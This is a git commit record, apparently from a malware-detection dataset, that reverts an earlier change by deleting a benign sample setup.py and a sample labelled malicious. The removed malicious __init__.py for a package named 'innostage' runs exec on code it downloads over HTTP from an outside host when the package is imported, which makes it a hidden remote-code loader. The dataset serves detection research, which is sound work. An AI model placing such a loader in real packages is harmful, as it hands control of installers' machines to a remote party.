f27a28d52c9915393a079226041f8fdc86976ec5
Marvin Schirrmacher <ms@schirrmacher.io>
2025-08-24 09:07:02 +0200

    Revert "let malwi triage findings"
    This reverts commit 4f4b108b728535ccecfda71447b82ef794910201.

--- python/benign/hello20241121-0.0/setup.py
+++
@@ -1,8 +0,0 @@
-from setuptools import setup,find_packages
-
-setup(
-	name='hello20241121',
-	version='0.0',
-	packages=find_packages(),
-	install_requires=[]
-)
--- python/malicious/data15/innostage_7.0.1/__init__.py
+++
@@ -1,3 +0,0 @@
-__version__='7.0.1'
-
-exec(__import__('requests').get('http://files.inostage.ru/version').text)
